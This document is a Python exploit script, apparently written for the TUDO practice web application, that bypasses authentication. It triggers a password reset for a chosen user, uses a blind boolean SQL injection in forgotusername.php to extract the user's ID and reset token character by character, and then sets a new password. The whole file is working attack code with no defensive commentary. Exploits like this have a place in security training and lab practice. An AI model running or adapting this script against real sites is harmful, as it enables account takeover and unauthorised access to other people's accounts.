# TUDO Authentication Bypass #1 - "sqli"
# William Moody
# December 21, 2025

import requests
import argparse
import sys

# Parse arguments
parser = argparse.ArgumentParser(description="Resets targeted user's password by dumping \
    password reset token through an SQLi in /forgotusername.php")
parser.add_argument("target",help="Target URL")
parser.add_argument("user",help="Target user")
parser.add_argument("password",help="New password")
args = parser.parse_args()

# Sanitize target URL
if args.target[-1] == "/":
    args.target = args.target[:-1]

# Send "forgot password" request for victim user
r = requests.post(
    f"{args.target}/forgotpassword.php",
    data={"username":args.user}
)
assert "Email sent!" in r.text
print(f"[*] Requested password reset for {args.user}")

# Define blind SQLi oracle function
def oracle(query):
    r = requests.post(
        f"{args.target}/forgotusername.php",
        data={"username":f"{query};--"}
    )
    return "User exists!" in r.text

# Find victim user's UID
uid = 0
while True:
    if oracle(f"{args.user}' and uid={uid}"):
        print(f"[*] Found {args.user}'s UID: {uid}")
        break
    uid += 1

# Dump password reset token for victim user
print("[*] Dumping password reset token: ", end='')
token = ""
for i in range(32):
    low = 48 # ASCII code for '0'
    high = 122 # ASCII code for 'z'
    mid = 0

    while low <= high:
        mid = (high + low) // 2

        if oracle(f"{args.user}' and (select ascii(substring(token,{i+1},1)) from "+\
                  f"tokens where uid={uid} order by tid limit 1)>'{mid}'"):
            low = mid + 1

        elif oracle(f"{args.user}' and (select ascii(substring(token,{i+1},1)) from "+\
                    f"tokens where uid={uid} order by tid limit 1)<'{mid}'"):
            high = mid - 1

        else:
            token += chr(mid)
            print(chr(mid),end='')
            sys.stdout.flush()
            break
print()

# Reset victim's password
r = requests.post(
    f"{args.target}/resetpassword.php",
    data={"token":token,"password1":args.password,"password2":args.password}
)
assert "Password changed!" in r.text
print(f"[+] Set {args.user}'s password to {args.password}")